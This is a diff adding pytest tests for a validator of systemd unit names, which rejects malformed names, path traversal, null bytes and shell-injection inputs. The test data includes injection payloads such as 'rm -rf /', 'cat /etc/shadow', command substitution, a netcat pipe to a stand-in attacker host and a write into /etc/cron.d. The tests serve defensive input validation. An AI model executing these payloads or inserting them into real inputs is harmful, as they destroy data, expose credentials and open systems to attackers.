@@ -10,6 +10,7 @@ from errander.execution.command_builder import (
     pkg_version_spec,
     safe_path,
     safe_pkg,
+    safe_systemd_unit_name,
     safe_ver,
 )
 
@@ -134,3 +135,54 @@ class TestBuildCmd:
     def test_parts_with_spaces_quoted(self) -> None:
         result = build_cmd(["echo", "hello world"])
         assert "'hello world'" in result
+
+
+class TestSafeSystemdUnitName:
+    """safe_systemd_unit_name() enforces systemd unit grammar — P2-3 adversarial tests."""
+
+    @pytest.mark.parametrize("unit", [
+        "nginx.service",
+        "cron.timer",
+        "sshd.socket",
+        "multi-user.target",
+        "data.mount",
+        "system-getty.slice",
+        "getty@tty1.service",
+        "dbus-org.freedesktop.network1.service",
+    ])
+    def test_valid_unit_names_accepted(self, unit: str) -> None:
+        assert safe_systemd_unit_name(unit) == unit
+
+    def test_empty_name_raises(self) -> None:
+        with pytest.raises(CommandBuildError, match="empty"):
+            safe_systemd_unit_name("")
+
+    def test_name_without_type_suffix_raises(self) -> None:
+        with pytest.raises(CommandBuildError, match="grammar"):
+            safe_systemd_unit_name("nginx")
+
+    def test_unknown_suffix_raises(self) -> None:
+        with pytest.raises(CommandBuildError, match="grammar"):
+            safe_systemd_unit_name("nginx.conf")
+
+    @pytest.mark.parametrize("payload", [
+        "nginx.service; rm -rf /",
+        "nginx.service && cat /etc/shadow",
+        "$(id).service",
+        "`whoami`.service",
+        "nginx.service|nc attacker 4444",
+        "nginx.service > /etc/cron.d/evil",
+        "nginx.service{evil}",
+    ])
+    def test_shell_injection_payloads_rejected(self, payload: str) -> None:
+        """Adversarial inputs with shell metacharacters must be rejected."""
+        with pytest.raises(CommandBuildError):
+            safe_systemd_unit_name(payload)
+
+    def test_path_traversal_rejected(self) -> None:
+        with pytest.raises(CommandBuildError):
+            safe_systemd_unit_name("../../etc/passwd.service")
+
+    def test_null_byte_rejected(self) -> None:
+        with pytest.raises(CommandBuildError):
+            safe_systemd_unit_name("nginx\x00.service")
